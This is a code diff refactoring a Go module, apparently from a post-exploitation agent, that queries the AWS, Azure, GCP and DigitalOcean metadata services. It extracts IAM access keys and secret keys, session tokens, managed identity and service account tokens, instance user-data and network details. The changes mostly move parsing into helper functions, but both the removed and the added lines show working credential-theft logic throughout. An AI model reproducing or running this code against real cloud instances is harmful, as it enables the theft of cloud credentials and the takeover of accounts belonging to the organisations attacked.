@@ -55,11 +55,7 @@ func (c *CloudMetadataCommand) Execute(task structs.Task) structs.CommandResult 
 	args := cloudMetadataArgs{Action: "detect", Provider: "auto", Timeout: defaultCloudTimeout}
 	if task.Params != "" {
 		if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("Error parsing parameters: %v", err),
-				Status:    "error",
-				Completed: true,
-			}
+			return errorf("Error parsing parameters: %v", err)
 		}
 	}
 	if args.Action == "" {
@@ -73,7 +69,6 @@ func (c *CloudMetadataCommand) Execute(task structs.Task) structs.CommandResult 
 	}
 
 	timeout := time.Duration(args.Timeout) * time.Second
-	var sb strings.Builder
 
 	switch args.Action {
 	case "detect":
@@ -89,8 +84,7 @@ func (c *CloudMetadataCommand) Execute(task structs.Task) structs.CommandResult 
 	case "network":
 		return cloudNetwork(args.Provider, timeout)
 	default:
-		sb.WriteString("Error: unknown action. Available: detect, all, creds, identity, userdata, network")
-		return structs.CommandResult{Output: sb.String(), Status: "error", Completed: true}
+		return errorResult("Error: unknown action. Available: detect, all, creds, identity, userdata, network")
 	}
 }
 
@@ -167,7 +161,7 @@ func cloudDetect(timeout time.Duration) structs.CommandResult {
 		sb.WriteString("    Tested: AWS IMDS, Azure IMDS, GCP metadata, DigitalOcean metadata\n")
 	}
 
-	return structs.CommandResult{Output: sb.String(), Status: "completed", Completed: true}
+	return successResult(sb.String())
 }
 
 // cloudAll dumps all available metadata from the detected/specified provider
@@ -176,11 +170,7 @@ func cloudAll(provider string, timeout time.Duration) structs.CommandResult {
 
 	providers := resolveProviders(provider, timeout)
 	if len(providers) == 0 {
-		return structs.CommandResult{
-			Output:    "[-] No cloud metadata service detected or specified provider not available",
-			Status:    "completed",
-			Completed: true,
-		}
+		return successResult("[-] No cloud metadata service detected or specified provider not available")
 	}
 
 	for _, p := range providers {
@@ -197,7 +187,7 @@ func cloudAll(provider string, timeout time.Duration) structs.CommandResult {
 		sb.WriteString("\n")
 	}
 
-	return structs.CommandResult{Output: sb.String(), Status: "completed", Completed: true}
+	return successResult(sb.String())
 }
 
 // cloudCreds extracts IAM credentials from the detected provider
@@ -207,11 +197,7 @@ func cloudCreds(provider string, timeout time.Duration) structs.CommandResult {
 
 	providers := resolveProviders(provider, timeout)
 	if len(providers) == 0 {
-		return structs.CommandResult{
-			Output:    "[-] No cloud metadata service detected or specified provider not available",
-			Status:    "completed",
-			Completed: true,
-		}
+		return successResult("[-] No cloud metadata service detected or specified provider not available")
 	}
 
 	for _, p := range providers {
@@ -227,7 +213,7 @@ func cloudCreds(provider string, timeout time.Duration) structs.CommandResult {
 		}
 	}
 
-	return structs.CommandResult{Output: sb.String(), Status: "completed", Completed: true}
+	return successResult(sb.String())
 }
 
 // cloudIdentity extracts instance identity information
@@ -237,11 +223,7 @@ func cloudIdentity(provider string, timeout time.Duration) structs.CommandResult
 
 	providers := resolveProviders(provider, timeout)
 	if len(providers) == 0 {
-		return structs.CommandResult{
-			Output:    "[-] No cloud metadata service detected",
-			Status:    "completed",
-			Completed: true,
-		}
+		return successResult("[-] No cloud metadata service detected")
 	}
 
 	for _, p := range providers {
@@ -257,7 +239,7 @@ func cloudIdentity(provider string, timeout time.Duration) structs.CommandResult
 		}
 	}
 
-	return structs.CommandResult{Output: sb.String(), Status: "completed", Completed: true}
+	return successResult(sb.String())
 }
 
 // cloudUserdata extracts instance user-data (may contain secrets)
@@ -267,11 +249,7 @@ func cloudUserdata(provider string, timeout time.Duration) structs.CommandResult
 
 	providers := resolveProviders(provider, timeout)
 	if len(providers) == 0 {
-		return structs.CommandResult{
-			Output:    "[-] No cloud metadata service detected",
-			Status:    "completed",
-			Completed: true,
-		}
+		return successResult("[-] No cloud metadata service detected")
 	}
 
 	for _, p := range providers {
@@ -287,7 +265,7 @@ func cloudUserdata(provider string, timeout time.Duration) structs.CommandResult
 		}
 	}
 
-	return structs.CommandResult{Output: sb.String(), Status: "completed", Completed: true}
+	return successResult(sb.String())
 }
 
 // cloudNetwork extracts network configuration
@@ -297,11 +275,7 @@ func cloudNetwork(provider string, timeout time.Duration) structs.CommandResult 
 
 	providers := resolveProviders(provider, timeout)
 	if len(providers) == 0 {
-		return structs.CommandResult{
-			Output:    "[-] No cloud metadata service detected",
-			Status:    "completed",
-			Completed: true,
-		}
+		return successResult("[-] No cloud metadata service detected")
 	}
 
 	for _, p := range providers {
@@ -317,48 +291,27 @@ func cloudNetwork(provider string, timeout time.Duration) structs.CommandResult 
 		}
 	}
 
-	return structs.CommandResult{Output: sb.String(), Status: "completed", Completed: true}
+	return successResult(sb.String())
 }
 
 // --- Helper functions ---
 
 // metadataGet makes a GET request to a metadata endpoint with optional headers
 func metadataGet(url string, timeout time.Duration, headers map[string]string) string {
-	ctx, cancel := context.WithTimeout(context.Background(), timeout)
-	defer cancel()
-
-	req, err := http.NewRequestWithContext(ctx, "GET", url, nil)
-	if err != nil {
-		return ""
-	}
-	for k, v := range headers {
-		req.Header.Set(k, v)
-	}
-
-	client := &http.Client{Timeout: timeout}
-	resp, err := client.Do(req)
-	if err != nil {
-		return ""
-	}
-	defer resp.Body.Close()
-
-	if resp.StatusCode != 200 {
-		return ""
-	}
-
-	body, err := io.ReadAll(io.LimitReader(resp.Body, metadataMaxSize))
-	if err != nil {
-		return ""
-	}
-	return strings.TrimSpace(string(body))
+	return metadataRequest("GET", url, timeout, headers, metadataMaxSize)
 }
 
 // metadataPut makes a PUT request (used for AWS IMDSv2 token)
 func metadataPut(url string, timeout time.Duration, headers map[string]string) string {
+	return metadataRequest("PUT", url, timeout, headers, 1024)
+}
+
+// metadataRequest makes an HTTP request to a metadata endpoint and returns the response body
+func metadataRequest(method, url string, timeout time.Duration, headers map[string]string, maxBody int64) string {
 	ctx, cancel := context.WithTimeout(context.Background(), timeout)
 	defer cancel()
 
-	req, err := http.NewRequestWithContext(ctx, "PUT", url, nil)
+	req, err := http.NewRequestWithContext(ctx, method, url, nil)
 	if err != nil {
 		return ""
 	}
@@ -377,7 +330,7 @@ func metadataPut(url string, timeout time.Duration, headers map[string]string) s
 		return ""
 	}
 
-	body, err := io.ReadAll(io.LimitReader(resp.Body, 1024))
+	body, err := io.ReadAll(io.LimitReader(resp.Body, maxBody))
 	if err != nil {
 		return ""
 	}
@@ -485,23 +438,7 @@ func awsGetCreds(timeout time.Duration) string {
 		sb.WriteString(fmt.Sprintf("[+] AWS IAM Role: %s\n", role))
 		creds := metadataGet(awsCredsURL+role, timeout, h)
 		if creds != "" {
-			var credMap map[string]interface{}
-			if err := json.Unmarshal([]byte(creds), &credMap); err == nil {
-				if ak, ok := credMap["AccessKeyId"].(string); ok {
-					sb.WriteString(fmt.Sprintf("    AccessKeyId:     %s\n", ak))
-				}
-				if sk, ok := credMap["SecretAccessKey"].(string); ok {
-					sb.WriteString(fmt.Sprintf("    SecretAccessKey: %s\n", sk))
-				}
-				if tok, ok := credMap["Token"].(string); ok {
-					sb.WriteString(fmt.Sprintf("    Token:           %s...\n", truncate(tok, 40)))
-				}
-				if exp, ok := credMap["Expiration"].(string); ok {
-					sb.WriteString(fmt.Sprintf("    Expiration:      %s\n", exp))
-				}
-			} else {
-				sb.WriteString(fmt.Sprintf("    Raw: %s\n", truncate(creds, 200)))
-			}
+			sb.WriteString(formatAWSCredsJSON(creds))
 		}
 	}
 	return sb.String()
@@ -518,16 +455,7 @@ func awsGetIdentity(timeout time.Duration) string {
 	}
 
 	sb.WriteString("[+] AWS Instance Identity Document:\n")
-	var idDoc map[string]interface{}
-	if err := json.Unmarshal([]byte(doc), &idDoc); err == nil {
-		for _, key := range []string{"accountId", "instanceId", "instanceType", "region", "availabilityZone", "architecture", "imageId", "privateIp"} {
-			if v, ok := idDoc[key]; ok {
-				sb.WriteString(fmt.Sprintf("    %-20s %v\n", key+":", v))
-			}
-		}
-	} else {
-		sb.WriteString(fmt.Sprintf("    %s\n", doc))
-	}
+	sb.WriteString(formatAWSIdentityJSON(doc))
 	return sb.String()
 }
 
@@ -594,43 +522,15 @@ func azureDumpAll(timeout time.Duration) string {
 		return sb.String()
 	}
 
-	var inst map[string]interface{}
-	if err := json.Unmarshal([]byte(resp), &inst); err == nil {
-		if compute, ok := inst["compute"].(map[string]interface{}); ok {
-			for _, key := range []string{"name", "vmId", "vmSize", "location", "resourceGroupName", "subscriptionId", "osType", "offer", "publisher", "sku", "version", "zone"} {
-				if v, ok := compute[key]; ok && v != "" {
-					sb.WriteString(fmt.Sprintf("  %-24s %v\n", key+":", v))
-				}
-			}
-			if tags, ok := compute["tagsList"].([]interface{}); ok && len(tags) > 0 {
-				sb.WriteString("  Tags:\n")
-				for _, t := range tags {
-					if tag, ok := t.(map[string]interface{}); ok {
-						sb.WriteString(fmt.Sprintf("    %v = %v\n", tag["name"], tag["value"]))
-					}
-				}
-			}
-		}
-		if network, ok := inst["network"].(map[string]interface{}); ok {
-			sb.WriteString("  Network:\n")
-			if ifaces, ok := network["interface"].([]interface{}); ok {
-				for _, iface := range ifaces {
-					if m, ok := iface.(map[string]interface{}); ok {
-						if ipv4, ok := m["ipv4"].(map[string]interface{}); ok {
-							if addrs, ok := ipv4["ipAddress"].([]interface{}); ok {
-								for _, a := range addrs {
-									if addr, ok := a.(map[string]interface{}); ok {
-										sb.WriteString(fmt.Sprintf("    Private IP: %v  Public IP: %v\n", addr["privateIpAddress"], addr["publicIpAddress"]))
-									}
-								}
-							}
-						}
-					}
-				}
-			}
-		}
-	} else {
-		sb.WriteString(fmt.Sprintf("  %s\n", truncate(resp, 2000)))
+	formatted := formatAzureInstanceJSON(resp)
+	if formatted != "" {
+		sb.WriteString(formatted)
+	}
+	// Network section from same response
+	sb.WriteString("  Network:\n")
+	netFormatted := formatAzureNetworkJSON(resp)
+	if netFormatted != "" {
+		sb.WriteString(netFormatted)
 	}
 
 	sb.WriteString("\n")
@@ -651,21 +551,7 @@ func azureGetToken(timeout time.Duration) string {
 		return sb.String()
 	}
 
-	var token map[string]interface{}
-	if err := json.Unmarshal([]byte(resp), &token); err == nil {
-		sb.WriteString("[+] Azure Managed Identity Token:\n")
-		if at, ok := token["access_token"].(string); ok {
-			sb.WriteString(fmt.Sprintf("    Access Token: %s...\n", truncate(at, 60)))
-		}
-		if rt, ok := token["resource"].(string); ok {
-			sb.WriteString(fmt.Sprintf("    Resource:     %s\n", rt))
-		}
-		if exp, ok := token["expires_on"].(string); ok {
-			sb.WriteString(fmt.Sprintf("    Expires On:   %s\n", exp))
-		}
-	} else {
-		sb.WriteString(fmt.Sprintf("[+] Azure Token (raw): %s\n", truncate(resp, 200)))
-	}
+	sb.WriteString(formatAzureTokenJSON(resp))
 	return sb.String()
 }
 
@@ -719,38 +605,8 @@ func azureGetNetwork(timeout time.Duration) string {
 		return sb.String()
 	}
 
-	var inst map[string]interface{}
-	if err := json.Unmarshal([]byte(resp), &inst); err == nil {
-		sb.WriteString("[+] Azure Network:\n")
-		if network, ok := inst["network"].(map[string]interface{}); ok {
-			if ifaces, ok := network["interface"].([]interface{}); ok {
-				for i, iface := range ifaces {
-					if m, ok := iface.(map[string]interface{}); ok {
-						sb.WriteString(fmt.Sprintf("  Interface %d:\n", i))
-						if mac, ok := m["macAddress"].(string); ok {
-							sb.WriteString(fmt.Sprintf("    MAC: %s\n", mac))
-						}
-						if ipv4, ok := m["ipv4"].(map[string]interface{}); ok {
-							if addrs, ok := ipv4["ipAddress"].([]interface{}); ok {
-								for _, a := range addrs {
-									if addr, ok := a.(map[string]interface{}); ok {
-										sb.WriteString(fmt.Sprintf("    Private: %v  Public: %v\n", addr["privateIpAddress"], addr["publicIpAddress"]))
-									}
-								}
-							}
-							if subnets, ok := ipv4["subnet"].([]interface{}); ok {
-								for _, s := range subnets {
-									if subnet, ok := s.(map[string]interface{}); ok {
-										sb.WriteString(fmt.Sprintf("    Subnet: %v/%v\n", subnet["address"], subnet["prefix"]))
-									}
-								}
-							}
-						}
-					}
-				}
-			}
-		}
-	}
+	sb.WriteString("[+] Azure Network:\n")
+	sb.WriteString(formatAzureNetworkJSON(resp))
 	return sb.String()
 }
 
@@ -823,15 +679,7 @@ func gcpGetToken(timeout time.Duration) string {
 		// Get token
 		tokenResp := metadataGet(gcpServiceAcctURL+acct+"token", timeout, h)
 		if tokenResp != "" {
-			var token map[string]interface{}
-			if err := json.Unmarshal([]byte(tokenResp), &token); err == nil {
-				if at, ok := token["access_token"].(string); ok {
-					sb.WriteString(fmt.Sprintf("    Access Token: %s...\n", truncate(at, 60)))
-				}
-				if exp, ok := token["expires_in"]; ok {
-					sb.WriteString(fmt.Sprintf("    Expires In:   %v seconds\n", exp))
-				}
-			}
+			sb.WriteString(formatGCPTokenJSON(tokenResp))
 		}
 	}
 	return sb.String()
@@ -941,27 +789,7 @@ func doDumpAll(timeout time.Duration) string {
 		return sb.String()
 	}
 
-	var doMeta map[string]interface{}
-	if err := json.Unmarshal([]byte(resp), &doMeta); err == nil {
-		for _, key := range []string{"droplet_id", "hostname", "region", "vendor_data", "public_keys"} {
-			if v, ok := doMeta[key]; ok {
-				sb.WriteString(fmt.Sprintf("  %-18s %v\n", key+":", v))
-			}
-		}
-		if ifaces, ok := doMeta["interfaces"].(map[string]interface{}); ok {
-			for netType, nets := range ifaces {
-				if netSlice, ok := nets.([]interface{}); ok {
-					for _, n := range netSlice {
-						if net, ok := n.(map[string]interface{}); ok {
-							sb.WriteString(fmt.Sprintf("  %s: ip=%v mac=%v\n", netType, net["ipv4"], net["mac"]))
-						}
-					}
-				}
-			}
-		}
-	} else {
-		sb.WriteString(truncate(resp, 2000))
-	}
+	sb.WriteString(formatDOMetadataJSON(resp))
 
 	sb.WriteString("\n")
 	sb.WriteString(doGetUserdata(timeout))
@@ -1011,35 +839,9 @@ func doGetNetwork(timeout time.Duration) string {
 		return sb.String()
 	}
 
-	var doMeta map[string]interface{}
-	if err := json.Unmarshal([]byte(resp), &doMeta); err == nil {
-		sb.WriteString("[+] DigitalOcean Network:\n")
-		if ifaces, ok := doMeta["interfaces"].(map[string]interface{}); ok {
-			for netType, nets := range ifaces {
-				if netSlice, ok := nets.([]interface{}); ok {
-					for _, n := range netSlice {
-						if net, ok := n.(map[string]interface{}); ok {
-							sb.WriteString(fmt.Sprintf("  %s:\n", netType))
-							if ipv4, ok := net["ipv4"].(map[string]interface{}); ok {
-								sb.WriteString(fmt.Sprintf("    IPv4: %v  Netmask: %v  Gateway: %v\n",
-									ipv4["ip_address"], ipv4["netmask"], ipv4["gateway"]))
-							}
-							if mac, ok := net["mac"].(string); ok {
-								sb.WriteString(fmt.Sprintf("    MAC:  %s\n", mac))
-							}
-						}
-					}
-				}
-			}
-		}
-	}
+	sb.WriteString("[+] DigitalOcean Network:\n")
+	sb.WriteString(formatDONetworkJSON(resp))
 	return sb.String()
 }
 
-// truncate returns the first n characters of a string
-func truncate(s string, n int) string {
-	if len(s) <= n {
-		return s
-	}
-	return s[:n]
-}
+// truncate moved to format_helpers.go
